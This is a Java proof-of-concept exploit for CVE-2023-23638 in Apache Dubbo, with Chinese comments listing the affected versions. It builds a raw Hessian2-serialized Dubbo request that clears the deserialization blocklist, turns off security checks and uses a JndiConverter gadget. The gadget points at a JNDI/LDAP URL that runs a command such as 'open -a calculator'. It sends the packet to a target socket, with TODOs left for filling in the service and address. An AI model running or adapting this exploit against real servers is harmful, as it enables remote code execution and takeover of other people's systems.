package top.lz2y.vul;

import org.apache.dubbo.common.beanutil.JavaBeanDescriptor;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.ObjectOutput;
import org.apache.dubbo.common.serialize.Serialization;
import org.apache.dubbo.common.serialize.fastjson2.FastJson2ObjectOutput;
import org.apache.dubbo.common.serialize.fastjson2.FastJson2Serialization;
import org.apache.dubbo.common.serialize.fastjson2.Fastjson2CreatorManager;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;
import org.apache.dubbo.common.serialize.hessian2.Hessian2Serialization;
import org.apache.dubbo.common.serialize.java.CompactedJavaSerialization;
import org.apache.dubbo.common.serialize.java.JavaObjectOutput;
import org.apache.dubbo.common.serialize.nativejava.NativeJavaObjectOutput;
import org.apache.dubbo.common.serialize.nativejava.NativeJavaSerialization;
import org.apache.dubbo.common.utils.ConcurrentHashSet;
import org.apache.dubbo.rpc.model.FrameworkModel;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.net.Socket;
import java.util.*;


/**
 * 漏洞编号:
 *      CVE-2023-23638
 * 适用版本:
 *      Apache Dubbo 2.7.0 to 2.7.21
 *      Apache Dubbo 3.0.x to 3.0.13
 *      Apache Dubbo 3.1.x to 3.1.5
 */
public class CVE202323638 {

    public static String EXPLOIT_VARIANT = "Hession";
    protected static final byte FLAG_REQUEST = (byte) 0x80;
    protected static final byte FLAG_RESPONSE = (byte) 0x00;
    protected static final byte FLAG_TWOWAY = (byte) 0x40;

    public static void main(String[] args) throws Exception{

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
//        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);

        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set request and serialization flag.
        header[2] = (byte) (FLAG_REQUEST | 2);
//        header[3] = (byte) ((byte) 0x00 | 20);
        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

        // set body
        out.writeUTF("xxx");
        out.writeUTF("3.1.10");
            //todo 此处填写Dubbo提供的服务名
        out.writeUTF("top.lz2y.service.DemoService");
        out.writeUTF("");
        out.writeUTF("$invoke");
        out.writeUTF("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
            //todo 此处填写Dubbo提供的服务的方法
        out.writeUTF("sayHello");
        out.writeObject(new String[] {"java.lang.String"});

        // normal invoke
//        out.writeObject(new Object[] {"hello"});
//        HashMap<String, Object> map = new HashMap<>();
//        map.put("generic", "raw.return");
//        out.writeObject(map);
        // Step-1
//        getBypassPayload(out);

        // Step-2
            // POC 1: raw.return
        getRawReturnPayload(out, "ldap://127.0.0.1:1389/Basic/Command/open -a calculator");
            // POC 2: bean
//        getBeanPayload(out, "ldap://127.0.0.1:8072/wNfSybNGMm/Plain/Exec/eyJjbWQiOiJjYWxjIn0=");

        out.flushBuffer();

        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

        //todo 此处填写Dubbo服务地址及端口
        Socket socket = new Socket("127.0.0.1", 20880);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }

    private static void getBypassPayload(Hessian2ObjectOutput out) throws IOException {
        HashMap<String, Object> instanceMap = new HashMap<>();
        instanceMap.put("class", "org.apache.dubbo.common.utils.SerializeClassChecker");
        instanceMap.put("CLASS_DESERIALIZE_BLOCKED_SET", new ConcurrentHashSet<>());
        HashMap<String, Object> scc = new HashMap<>();
        scc.put("class", "org.apache.dubbo.common.utils.SerializeClassChecker");
        scc.put("INSTANCE", instanceMap);
        out.writeObject(new Object[]{scc});

        HashMap<String, Object> map = new HashMap<>();
        map.put("generic", "raw.return");
        out.writeObject(map);
    }

    private static Map getProperties() throws IOException {
        Properties properties = new Properties();
        properties.setProperty("dubbo.security.serialize.generic.native-java-enable", "true");
        properties.setProperty("serialization.security.check", "false");
        HashMap map = new HashMap();
        map.put("class", "java.lang.System");
        map.put("properties", properties);

        return map;
    }

    private static void getNativeJavaPayload(Hessian2ObjectOutput out) throws IOException {
        // TODO
    }

    private static void getRawReturnPayload(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        HashMap<String, Object> jndi = new HashMap<>();
        jndi.put("class", "org.apache.xbean.propertyeditor.JndiConverter");
        jndi.put("asText", ldapUri);
        out.writeObject(new Object[]{jndi});

        HashMap<String, Object> map = new HashMap<>();
        map.put("generic", "raw.return");
        out.writeObject(map);
    }

    private static void getBeanPayload(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        JavaBeanDescriptor javaBeanDescriptor = new JavaBeanDescriptor("org.apache.xbean.propertyeditor.JndiConverter",7);
        javaBeanDescriptor.setProperty("asText",ldapUri);
        out.writeObject(new Object[]{javaBeanDescriptor});
        HashMap<String, Object> map = new HashMap<>();

        map.put("generic", "bean");
        out.writeObject(map);
    }
}
